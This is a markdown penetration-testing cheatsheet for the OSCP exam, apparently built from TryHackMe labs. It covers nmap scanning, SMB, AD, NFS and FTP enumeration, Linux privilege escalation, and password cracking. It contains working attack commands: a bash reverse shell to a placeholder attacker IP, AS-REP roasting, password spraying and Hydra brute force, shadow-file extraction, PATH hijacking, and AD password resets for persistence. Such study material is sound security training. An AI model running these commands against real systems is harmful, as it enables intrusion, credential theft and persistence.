# OSCP Cheatsheet

## Table of Contents

- [Scanning & Enumeration](#scanning--enumeration)
  - [Nmap Basics](#nmap-basics)
  - [Service Enumeration](#service-enumeration)
    - [SMB](#smb)
    - [Active Directory](#active-directory)
    - [NFS](#nfs)
    - [FTP](#ftp)
- [Reverse Shells](#reverse-shells)
  - [Bash Reverse Shell](#bash-reverse-shell)
- [Privilege Escalation](#privilege-escalation)
  - [Linux](#linux)
    - [SUID Files](#suid-files)
    - [Linux Capabilities](#linux-capabilities)
    - [Cron Jobs](#cron-jobs)
    - [Writable Directories](#writable-directories)
- [Password Cracking](#password-cracking)
  - [John the Ripper](#john-the-ripper)
  - [Unshadow](#unshadow)
  - [Hydra](#hydra)

---

## Scanning & Enumeration

### Nmap Basics

* **SYN Stealth Scan (Default)** - Fast and stealthy TCP port scan that doesn't complete the TCP handshake

```bash
nmap -sS <target>
```

* `-sS`: SYN scan (also called half-open scan) - sends SYN packets without completing the handshake
* Default scan type when run as root/administrator
* Fast and relatively stealthy (doesn't complete TCP connections)
* Requires root/administrator privileges to craft raw packets
* Most common scan type for initial reconnaissance

* **TCP Connect Scan** - Completes full TCP handshake, works without root privileges

```bash
nmap -sT <target>
```

* `-sT`: TCP connect scan - completes full TCP three-way handshake
* Default scan type when run as non-root user
* Slower than SYN scan but doesn't require special privileges
* More likely to be logged by target systems
* Use when you don't have root access

* **UDP Scan** - Scans UDP ports (slower than TCP scans)

```bash
nmap -sU <target>
```

* `-sU`: UDP port scan
* Much slower than TCP scans (UDP is connectionless)
* Often combined with TCP scan: `nmap -sS -sU <target>`
* Common UDP ports: 53 (DNS), 67/68 (DHCP), 161 (SNMP), 123 (NTP)

* **NULL Scan** - Sends packets with no flags set (stealth scan)

```bash
nmap -sN <target>
```

* `-sN`: NULL scan - sends packets with no TCP flags set
* Stealth scan technique (may bypass some firewalls)
* Requires root privileges
* Works on systems that don't follow RFC 793 strictly

* **FIN Scan** - Sends packets with only FIN flag set (stealth scan)

```bash
nmap -sF <target>
```

* `-sF`: FIN scan - sends packets with only FIN flag set
* Stealth scan technique
* Requires root privileges
* Similar to NULL scan, may bypass some firewalls

* **Xmas Scan** - Sends packets with FIN, PSH, and URG flags set (stealth scan)

```bash
nmap -sX <target>
```

* `-sX`: Xmas scan - sends packets with FIN, PSH, and URG flags set (like a Christmas tree)
* Stealth scan technique
* Requires root privileges
* Named "Xmas" because the flags are "lit up" like a Christmas tree

* **Comprehensive Scan** - Combines multiple scan types and options

```bash
nmap -sS -sV -sC -O -p- <target>
```

* `-sS`: SYN scan
* `-sV`: Version detection
* `-sC`: Run default NSE scripts
* `-O`: OS detection
* `-p-`: Scan all 65535 ports (default scans top 1000 ports)
* Comprehensive scan for thorough enumeration

* **Version Detection Scan** - Probes open ports to determine service/version information

```bash
nmap -sV <target>
```

* `-sV`: Enables version detection, which probes open ports to determine what service and version is running on them

### Service Enumeration

#### SMB

* **SMB Share and User Enumeration** - Enumerates SMB shares and users on a target system

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target>
```

* `-p 445`: Scans port 445 (SMB/CIFS)
* `--script=smb-enum-shares.nse,smb-enum-users.nse`: Runs NSE scripts to enumerate SMB shares and users
* `smb-enum-shares.nse`: Lists available SMB shares on the target
* `smb-enum-users.nse`: Enumerates users on the SMB server (may require credentials)

* **Metasploit SMB Share Enumeration** - Uses Metasploit auxiliary module to enumerate SMB shares

```bash
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS <target>
msf6 auxiliary(scanner/smb/smb_enumshares) > run
```

* `use auxiliary/scanner/smb/smb_enumshares`: Loads the SMB share enumeration auxiliary module
* `set RHOSTS <target>`: Sets the target IP address or range
* `run`: Executes the module to enumerate SMB shares

* **SMB Share Enumeration** - Lists all available SMB shares on a target without authentication

```bash
smbclient -L //<target> -N
```

* `smbclient`: Command-line SMB/CIFS client for accessing SMB shares
* `-L`: List flag - enumerates all available shares without connecting to a specific share
* `//<target>`: Specifies the target IP address (e.g., `//10.82.151.31`)
* `-N`: No password flag - attempts null session authentication (no password required)
* Useful for initial enumeration to discover available shares before attempting to access them
* Works when anonymous/null session access is enabled on the SMB server

* **SMB Client Connection** - Connects to an SMB share using smbclient

```bash
smbclient //<target>/<share>
```

* `smbclient`: Command-line SMB/CIFS client for accessing SMB shares
* `//<target>/<share>`: Specifies the target IP and share name (e.g., `//10.81.182.140/anonymous`)
* Once connected, use commands like `ls`, `get <file>`, `put <file>`, `cd <directory>`, `exit`

* **SMB Recursive Download** - Downloads files recursively from an SMB share

```bash
smbget -R smb://<target>/<share>
```

* `smbget`: Utility to download files from SMB shares
* `-R`: Recursive flag - downloads all files and subdirectories
* `smb://<target>/<share>`: Specifies the target IP and share name (e.g., `smb://10.81.182.140/anonymous`)

* **SMB Brute Force with CrackMapExec** - Performs brute force attack against SMB service using username list and password

```bash
nxc smb 10.82.151.31 -d thm.corp -u users.txt -p 'ResetMe123!' --continue-on-success
```

* `nxc`: CrackMapExec (NetExec) - network security tool for penetration testing
* `smb`: Target protocol (SMB/CIFS)
* `10.82.151.31`: Target IP address
* `-d thm.corp`: Domain name for authentication (optional - use when targeting domain-joined systems)
* `-u users.txt`: Username wordlist file (use `-u username` for single user)
* `-p 'ResetMe123!'`: Password to test (use `-P passwords.txt` for password wordlist)
* `--continue-on-success`: Continue testing even after finding valid credentials
* **Works with both**: Samba servers (Linux/Unix) and Windows SMB servers (standalone or Active Directory)
* Useful for password spraying attacks and credential enumeration
* Can also enumerate shares, sessions, and logged-in users with valid credentials

#### Active Directory

* **SID Enumeration with Impacket** - Enumerates Security Identifiers (SIDs) and users/groups on a Windows domain controller

```bash
lookupsid.py <domain>/<username>@<target>
```

* `lookupsid.py`: Impacket tool for SID enumeration via MS-RPC
* `<domain>/<username>@<target>`: Authentication credentials and target (e.g., `thm.corp/guest@10.82.151.31`)
* Requires valid domain credentials (often works with guest account or null session)
* Enumerates domain SID and all users, groups, and aliases in the Active Directory domain
* Output includes RID (Relative Identifier) and account type (SidTypeUser, SidTypeGroup, SidTypeAlias)
* Useful for discovering all domain users and groups for further enumeration
* Can reveal hidden or non-standard user accounts that might not appear in other enumeration methods
* **Note**: This tool is specific to Active Directory/Windows Domain Controllers
* Example: `lookupsid.py thm.corp/guest@10.82.151.31`

* **AS-REP Roasting with Impacket** - Attempts to retrieve Kerberos AS-REP tickets for users who don't require pre-authentication

```bash
GetNPUsers.py <domain>/ -no-pass -usersfile <users.txt> -dc-ip <target>
```

* `GetNPUsers.py`: Impacket tool for AS-REP Roasting attack
* `<domain>/`: Domain name (e.g., `thm.corp/`)
* `-no-pass`: No password flag - uses null session/anonymous authentication
* `-usersfile <users.txt>`: File containing list of usernames to test (one per line)
* `-dc-ip <target>`: IP address of the Domain Controller
* **AS-REP Roasting**: Attacks users with "Do not require Kerberos preauthentication" enabled
* If a user has this option enabled, retrieves an AS-REP ticket containing an encrypted hash
* The hash can be cracked offline using tools like `hashcat` or `john` to recover the password
* **No credentials required** - works with anonymous/null session access
* Output format: `$krb5asrep$23$username@DOMAIN:hash` (can be cracked with hashcat mode 18200 or john)
* Example: `GetNPUsers.py thm.corp/ -no-pass -usersfile users.txt -dc-ip 10.82.151.31`

* **Reset User Password and Enable Account (PowerShell)** - Resets a user's password and enables their account in Active Directory

```powershell
Set-ADAccountPassword -Identity <username> -Reset -NewPassword (ConvertTo-SecureString '<password>' -AsPlainText -Force)
Set-ADUser -Identity <username> -Enabled $true
```

* `Set-ADAccountPassword`: PowerShell cmdlet to reset a user's password in Active Directory
* `-Identity <username>`: Username of the account to modify (e.g., `Darla_Winters`)
* `-Reset`: Resets the password (forces password change)
* `-NewPassword (ConvertTo-SecureString ...)`: Sets the new password (must be converted to SecureString)
* `-AsPlainText -Force`: Allows plaintext password input (required for ConvertTo-SecureString)
* `Set-ADUser -Identity <username> -Enabled $true`: Enables a disabled user account
* **Requires**: Domain Admin privileges or Account Operator permissions
* **Use cases**:
  * Post-exploitation: After gaining Domain Admin access, reset passwords to maintain persistence
  * Privilege escalation: Enable disabled accounts or reset passwords of accounts you've compromised
  * Lateral movement: Reset passwords of other user accounts to expand access
* **Note**: These commands must be run on a Domain Controller or a machine with RSAT (Remote Server Administration Tools) installed
* Example: `Set-ADAccountPassword -Identity Darla_Winters -Reset -NewPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)`

#### NFS

* **NFS Share Enumeration** - Enumerates NFS shares, lists contents, and shows filesystem statistics

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target>
```

* `-p 111`: Scans port 111 (rpcbind - port mapper service used by NFS)
* `--script=nfs-ls,nfs-statfs,nfs-showmount`: Runs NSE scripts to enumerate NFS shares
* `nfs-ls.nse`: Lists files and directories in exported NFS shares with permissions, UIDs, GIDs, and timestamps
* `nfs-statfs.nse`: Shows filesystem statistics (disk space, usage percentage, max file size, etc.)
* `nfs-showmount.nse`: Lists all exported NFS shares on the target

* **Mount NFS Share** - Mounts an NFS share locally to explore its contents

```bash
mkdir /tmp/nfs_mount
mount -t nfs <target>:/<share> /tmp/nfs_mount
cd /tmp/nfs_mount
ls -la
```

* `mkdir /tmp/nfs_mount`: Creates a local directory to mount the NFS share
* `mount -t nfs`: Mounts an NFS filesystem
* `<target>:/<share>`: Specifies the target IP and exported share path (e.g., `10.81.182.140:/var`)
* `/tmp/nfs_mount`: Local mount point directory
* After mounting, explore the share with standard Linux commands (`ls`, `cat`, `find`, etc.)

* **Unmount NFS Share** - Unmounts a mounted NFS share

```bash
umount /tmp/nfs_mount
```

* `umount`: Unmounts a filesystem from the mount point

#### FTP

* **FTP Connection with Netcat** - Connects to FTP server using netcat to interact with the service

```bash
nc <target> 21
```

* `nc`: Netcat - network utility for reading from and writing to network connections
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* `21`: FTP port number
* After connecting, you can interact with the FTP server directly (try `USER anonymous`, `PASS anonymous`, `HELP`, etc.)

* **FTP Client Connection** - Connects to FTP server using ftp client

```bash
ftp <target>
```

* `ftp`: FTP client command-line tool
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* Common FTP commands: `ls`, `cd <directory>`, `get <file>`, `put <file>`, `binary`, `ascii`, `passive`, `quit`

* **FTP Anonymous Login** - Attempts anonymous login to FTP server

```bash
ftp <target>
# When prompted:
# Name: anonymous
# Password: anonymous (or press Enter)
```

* Many FTP servers allow anonymous access with username `anonymous` and any password (or blank)

* **FTP Enumeration with Nmap** - Enumerates FTP service and attempts anonymous login

```bash
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst <target>
```

* `-p 21`: Scans port 21 (FTP)
* `--script=ftp-anon,ftp-bounce,ftp-syst`: Runs NSE scripts to enumerate FTP
* `ftp-anon.nse`: Checks if anonymous FTP login is allowed
* `ftp-bounce.nse`: Checks for FTP bounce attack vulnerability
* `ftp-syst.nse`: Retrieves system information from FTP server

---

## Reverse Shells

### Bash Reverse Shell

* **Bash Reverse Shell** - Creates a reverse shell connection back to the attacker's machine using bash

```bash
bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
```

* `bash -i`: Starts an interactive bash shell
* `>& /dev/tcp/{ATTACKER-IP}/{PORT}`: Redirects stdout and stderr to a TCP connection to the attacker's IP and port
* `0>&1`: Redirects stdin (file descriptor 0) to stdout (file descriptor 1), completing the bidirectional connection
* Replace `{ATTACKER-IP}` with your attacking machine's IP address (e.g., `10.10.10.5`)
* Replace `{PORT}` with the port you're listening on (e.g., `4444`)
* **On attacker machine**, set up a listener first: `nc -lvnp <PORT>` or `rlwrap nc -lvnp <PORT>` (for better shell interaction)
* Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
* Works on systems with bash and `/dev/tcp` support (most Linux systems)

---

## Privilege Escalation

### Linux

#### SUID Files

* **Find SUID Files** - Searches for files with SUID (Set User ID) bit set, which can be exploited for privilege escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

* `find /`: Searches from root directory
* `-perm -u=s`: Finds files with SUID bit set (executes with owner's privileges)
* `-type f`: Only searches for files (not directories)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* SUID files run with the privileges of the file owner, which can be exploited if the owner is root
* Common exploitable SUID binaries: `find`, `nmap`, `vim`, `nano`, `less`, `more`, `cp`, `mv`, etc.

* **Find SUID Files (Detailed Listing)** - Searches for SUID files with detailed file information to verify specific binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

* `find /`: Searches from root directory
* `-type f`: Only searches for files (not directories)
* `-perm -04000`: Finds files with SUID bit set using octal notation (04000 = SUID bit)
* `-ls`: Provides detailed listing similar to `ls -l` (shows permissions, owner, size, timestamps, etc.)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* Use this command to see detailed information about SUID files, including verifying that the nano text editor has the SUID bit set
* More useful when you need detailed information about SUID files (permissions, ownership, size) to identify exploitable binaries

#### Linux Capabilities

* **Find Files with Capabilities** - Searches for files with Linux capabilities set, which can be exploited for privilege escalation

```bash
getcap -r / 2>/dev/null
```

* `getcap`: Command to display capabilities of files
* `-r`: Recursive flag - searches recursively through directories
* `/`: Starting directory (root directory)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* Linux capabilities provide fine-grained control over privileges, allowing specific capabilities without full root access
* Files with dangerous capabilities (like `cap_setuid`, `cap_sys_admin`, `cap_dac_override`) can be exploited for privilege escalation
* Common exploitable capabilities: `cap_setuid+ep` (can set UID), `cap_sys_admin+ep` (system administration), `cap_dac_override+ep` (bypass file permissions)

#### Cron Jobs

* **Check System Cron Jobs** - Views system-wide cron jobs that may run with elevated privileges

```bash
cat /etc/crontab
```

* `/etc/crontab`: System-wide crontab file that defines scheduled tasks
* Cron jobs that run as root can be exploited if they execute scripts in writable directories
* Look for cron jobs that run scripts you can modify or that run from directories you have write access to

* **Check User Cron Jobs** - Views user-specific cron jobs

```bash
crontab -l
```

* `crontab -l`: Lists cron jobs for the current user
* Check if any cron jobs run scripts you can modify

* **Check All Cron Directories** - Checks common cron directories for scheduled tasks

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/*
```

* `/etc/cron*`: System cron directories (`/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, etc.)
* `/var/spool/cron/crontabs/*`: User-specific crontab files
* Look for scripts referenced in cron jobs that are writable or in writable directories

* **Find Writable Cron Scripts** - Searches for writable scripts referenced in cron jobs

```bash
find /etc/cron* -type f -perm -0002 2>/dev/null
```

* `find /etc/cron*`: Searches in cron directories
* `-type f`: Only searches for files
* `-perm -0002`: Finds files with world-writable permissions (anyone can modify)
* `2>/dev/null`: Suppresses error messages
* If a cron job runs a world-writable script, you can modify it to execute commands as the cron job's user (often root)

* **Check Cron Job Permissions** - Lists cron files with detailed permissions

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null
```

* Shows detailed file permissions, ownership, and timestamps
* Helps identify which cron jobs run as root and which scripts they execute
* Look for scripts in directories you have write access to (e.g., `/tmp`, `/var/tmp`, user home directories)

#### Writable Directories

* **Find Writable Directories** - Searches for writable directories that may be exploitable for privilege escalation

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

* `find / -writable`: Finds all writable files and directories starting from root
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* `cut -d "/" -f 2,3`: Extracts the first two directory levels (e.g., `/tmp`, `/var/tmp`, `/home/user`)
* `grep -v proc`: Excludes `/proc` directory (virtual filesystem, not useful for exploitation)
* `sort -u`: Sorts and shows only unique directory paths
* Writable directories can be exploited if:
  * Cron jobs execute scripts from these directories
  * PATH manipulation (placing malicious binaries in writable directories in PATH)
  * Log file manipulation (if log files are in writable directories)
  * Configuration file modification (if config files are writable)
* Common writable directories: `/tmp`, `/var/tmp`, `/dev/shm`, user home directories, `/opt`, `/var/www`

* **PATH Manipulation** - Modifies the PATH environment variable to include a writable directory for privilege escalation

```bash
export PATH=/tmp:$PATH
```

* `export PATH=/tmp:$PATH`: Prepends `/tmp` to the beginning of the PATH environment variable
* `/tmp`: Writable directory (can be any writable directory like `/var/tmp`, `/home/user`, etc.)
* `:$PATH`: Appends the original PATH after the new directory
* **Exploitation scenario**: If a SUID binary or cron job runs a command without an absolute path (e.g., `ls` instead of `/bin/ls`), it will search directories in PATH order
* **Steps to exploit**:
  1. Create a malicious binary with the same name as a command (e.g., `ls`, `cat`, `python`)
  2. Place it in the writable directory (e.g., `/tmp/ls`)
  3. Make it executable: `chmod +x /tmp/ls`
  4. Export PATH: `export PATH=/tmp:$PATH`
  5. When the SUID binary or cron job runs the command, it will execute your malicious binary with elevated privileges
* **Check for exploitable binaries**: Look for SUID binaries or cron jobs that call commands without absolute paths

---

## Password Cracking

### John the Ripper

* **Crack Password Hash** - Cracks password hashes using John the Ripper with a wordlist

```bash
john --format=crypt --wordlist=rockyou.txt hash.txt
```

* `john`: John the Ripper password cracking tool
* `--format=crypt`: Specifies the hash format (crypt format for traditional Unix password hashes)
* `--wordlist=rockyou.txt`: Uses the rockyou.txt wordlist (commonly located in `/usr/share/wordlists/rockyou.txt`)
* `hash.txt`: File containing the password hash(es) to crack
* Common hash formats: `crypt` (Unix), `md5crypt`, `sha512crypt`, `NT` (Windows), `raw-md5`, `raw-sha1`, etc.
* To identify hash format automatically, use: `john --format=auto hash.txt` or `hashid hash.txt`

* **Crack Windows NT Hashes** - Cracks Windows NT password hashes (from SAM database)

```bash
john --format=NT --wordlist=rockyou.txt hash.txt
```

* `--format=NT`: Specifies NT hash format (Windows NTLM/NT hashes)
* `--wordlist=rockyou.txt`: Uses the rockyou.txt wordlist
* `hash.txt`: File containing Windows NT hashes (typically extracted from Windows SAM database)
* **Usage scenario**: After extracting Windows password hashes from SAM database or other Windows systems
* Windows NT hashes are typically 32-character hexadecimal strings (MD4 hash of the password)
* Can also use `--format=NT` for NTLM hashes (same format)

### Unshadow

* **Combine passwd and shadow files** - Combines `/etc/passwd` and `/etc/shadow` files into a format that John the Ripper can crack

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

* `unshadow`: Utility from the John the Ripper suite that combines passwd and shadow files
* `/etc/passwd`: Contains user account information (username, UID, GID, home directory, shell)
* `/etc/shadow`: Contains password hashes (only readable by root)
* `> hashes.txt`: Outputs the combined file in a format John can crack
* **Usage scenario**: After gaining root access, extract password hashes to crack user passwords
* **Workflow**:
  1. On target machine (as root): `cat /etc/passwd > passwd.txt` and `cat /etc/shadow > shadow.txt`
  2. Transfer files to attacking machine
  3. Run: `unshadow passwd.txt shadow.txt > unshadowed.txt`
  4. Crack with John: `john --wordlist=rockyou.txt unshadowed.txt`
* **Output format**: Combines username from `/etc/passwd` with hash from `/etc/shadow` (e.g., `username:$6$salt$hash:1001:1001:User Name:/home/username:/bin/bash`)
* Useful for password reuse attacks and gaining access to other user accounts on the system

### Hydra

* **FTP Brute Force Attack** - Performs brute force attack against FTP service using a username and password wordlist

```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.82.136.134:10021
```

* `hydra`: Parallelized login cracker that supports many protocols
* `-l eddie`: Specifies a single username to test (use `-L users.txt` for a username list)
* `-P /usr/share/wordlists/rockyou.txt`: Specifies password wordlist file (use `-p password` for single password)
* `ftp://10.82.136.134:10021`: Target service URL (protocol://IP:PORT)
* **Supported protocols**: `ftp`, `ssh`, `http`, `https`, `smb`, `rdp`, `telnet`, `mysql`, `postgresql`, `mssql`, `vnc`, `snmp`, `ldap`, etc.
* **Common options**:
  * `-t <threads>`: Number of parallel tasks (default: 16)
  * `-V`: Verbose mode - shows each login attempt
  * `-f`: Stop after first valid password found
  * `-s <port>`: Specify port if non-standard
* **Example with username list**: `hydra -L users.txt -P passwords.txt ftp://target`
* **Example with SSH**: `hydra -l root -P rockyou.txt ssh://target`
* **Example with HTTP POST**: `hydra -l admin -P rockyou.txt http-post-form://target/login.php:username=^USER^&password=^PASS^:F=incorrect`
